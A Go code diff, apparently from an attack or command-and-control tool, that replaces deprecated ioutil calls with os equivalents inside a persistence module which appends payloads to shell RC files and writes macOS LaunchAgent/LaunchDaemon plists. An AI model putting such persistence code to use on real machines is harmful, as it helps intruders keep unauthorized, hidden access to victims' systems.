@@ -7,7 +7,6 @@ package main
 import (
 	"bytes"
 	"fmt"
-	"io/ioutil"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -156,12 +155,12 @@ func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) e
 	info, err := os.Stat(filepath)
 	if err != nil {
 		if os.IsNotExist(err) {
-			return ioutil.WriteFile(filepath, []byte(payload), 0644)
+			return os.WriteFile(filepath, []byte(payload), 0644)
 		}
 		return err
 	}
 
-	content, err := ioutil.ReadFile(filepath)
+	content, err := os.ReadFile(filepath)
 	if err != nil {
 		return err
 	}
@@ -171,7 +170,7 @@ func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) e
 	}
 
 	newContent := append(content, []byte("\n"+payload)...)
-	return ioutil.WriteFile(filepath, newContent, info.Mode())
+	return os.WriteFile(filepath, newContent, info.Mode())
 }
 
 // handleLaunchPersistence installs LaunchAgent/LaunchDaemon
@@ -243,7 +242,7 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	}
 
 	// Write plist file
-	if err := ioutil.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
+	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
 		return CommandResult{
 			Output:   fmt.Sprintf("Failed to write plist: %v", err),
 			ExitCode: 1,
